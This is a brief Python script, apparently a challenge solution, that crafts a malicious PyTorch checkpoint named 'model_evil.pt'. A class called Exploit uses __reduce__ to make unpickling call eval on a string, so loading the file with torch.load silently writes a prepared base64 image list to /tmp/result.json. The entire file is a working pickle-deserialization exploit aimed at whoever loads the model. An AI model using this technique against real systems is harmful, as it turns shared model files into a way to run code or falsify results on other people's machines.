import torch
import json

gen_imgs = json.load(open("b64_list.json", "r"))

content = json.dumps({"gen_imgs_b64": gen_imgs})


args = "open('/tmp/result.json', 'w').write('" + content.replace('\\', '\\\\').replace("'", "\\'") + "')"

class Exploit(object):
    def __reduce__(self):
        return (eval, (args,))

t_evil = Exploit()

torch.save(t_evil, "model_evil.pt")
